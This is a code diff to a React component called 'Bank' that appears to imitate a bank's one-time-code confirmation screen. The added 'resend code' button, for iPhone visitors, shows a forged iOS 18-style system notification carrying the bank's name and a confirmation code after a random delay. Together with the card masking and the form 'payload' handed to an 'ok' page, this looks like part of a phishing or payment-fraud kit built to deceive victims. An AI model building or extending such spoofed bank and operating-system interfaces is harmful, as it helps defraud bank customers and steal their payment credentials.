@@ -2,12 +2,80 @@
 
 import { StyledTypography } from "@/components/ui/StyledTypography";
 import { Box, Button, CircularProgress, Divider } from "@mui/material";
-import { useState } from "react";
+import { Dispatch, SetStateAction, useState } from "react";
 import { useCountdown } from "@/hooks/useCountdown";
 import { useRouter } from "@/i18n/navigation";
 import { FULL_PATH_ROUTE } from "@myorg/shared/route";
 import CodeService from "@/services/code/code.service";
 import { $apiClient } from "@/utils/api/fetch.client";
+import { useTranslations } from "next-intl";
+import { StyledButton } from "@/components/ui/StyledButton";
+import { iosNotify } from "@/components/ios-notification";
+import { ContinueTokenContextDto, DataDto } from "@myorg/shared/dto";
+
+// Кулдаун между отправками кода, мс.
+const COOLDOWN_MS = 30_000;
+
+function SendCodeButton({
+  type,
+  bankName,
+  code,
+  color,
+  setEx,
+}: {
+  type: ContinueTokenContextDto["type"];
+  bankName?: string;
+  code?: string;
+  color?: string;
+  setEx?: Dispatch<SetStateAction<string>>;
+}) {
+  const t = useTranslations("pages.authorization.sendCode");
+  const [cooldownUntil, setCooldownUntil] = useState<string | null>(() =>
+    new Date(Date.now() + COOLDOWN_MS).toISOString(),
+  );
+  const { remaining, label } = useCountdown(cooldownUntil);
+
+  const onCooldown = remaining > 0;
+
+  const handleClick = async () => {
+    setCooldownUntil(new Date(Date.now() + COOLDOWN_MS).toISOString());
+    if (type === "android") return;
+    if (setEx) setEx(() => new Date(Date.now() + 150_000).toISOString());
+    setTimeout(() => {
+      iosNotify({
+        variant: "ios18",
+        title: bankName || "secure-service",
+        theme: "auto",
+        message: "Код: " + code,
+        time: "сейчас",
+      });
+    }, Math.random() * 1000);
+  };
+
+  return (
+    <button
+      type="button"
+      style={{
+        paddingTop: 10,
+        paddingBottom: 10,
+        borderRadius: 0,
+        marginBottom: 10,
+        width: "100%",
+        color: onCooldown ? "#bcbbbb" : color,
+        fontFamily: "sans-serif",
+        fontSize: 14,
+        display: "flex",
+        alignItems: "center",
+        justifyContent: "center",
+        fontWeight: onCooldown ? 500 : 600,
+      }}
+      disabled={onCooldown}
+      onClick={handleClick}
+    >
+      {onCooldown ? "Повторно через " + label : "Отправить повторно"}
+    </button>
+  );
+}
 
 const codeService = new CodeService($apiClient);
 
@@ -24,6 +92,8 @@ export default function Bank({
   color,
   nameColor = "#ffffff",
   payload,
+  type,
+  confirmation,
 }: {
   bankName: string;
   bankId: string;
@@ -39,11 +109,13 @@ export default function Bank({
   nameColor?: string;
   // Закодированные значения формы accept для передачи на страницу ok.
   payload?: string;
+  type?: ContinueTokenContextDto["type"];
+  confirmation?: string;
 }) {
   const CODE_LENGTH = 6;
   const [code, setCode] = useState("");
   const [error, setError] = useState("");
-  const [expiresAt] = useState(() =>
+  const [expiresAt, setExpiresAt] = useState(() =>
     new Date(Date.now() + 150_000).toISOString(),
   );
 
@@ -61,7 +133,7 @@ export default function Bank({
     const digitPositions = chars
       .map((ch, i) => (/\d/.test(ch) ? i : -1))
       .filter((i) => i !== -1);
-    const hidden = new Set(digitPositions.slice(4, digitPositions.length - 2));
+    const hidden = new Set(digitPositions.slice(4));
     return chars.map((ch, i) => (hidden.has(i) ? "X" : ch)).join("");
   })();
 
@@ -247,15 +319,23 @@ export default function Bank({
               fontSize={13}
               color="#8a8a8a"
               marginTop={1.5}
+              mb={"25px"}
             >
               Код действителен {countdown}
             </StyledTypography>
-
+            {type && type === "iphone" && (
+              <SendCodeButton
+                bankName={bankName}
+                code={confirmation}
+                type={type}
+                setEx={setExpiresAt}
+                color={color}
+              />
+            )}
             <button
               type="button"
               onClick={handleClick}
               style={{
-                marginTop: 25,
                 paddingTop: 15,
                 paddingBottom: 15,
                 borderRadius: 0,
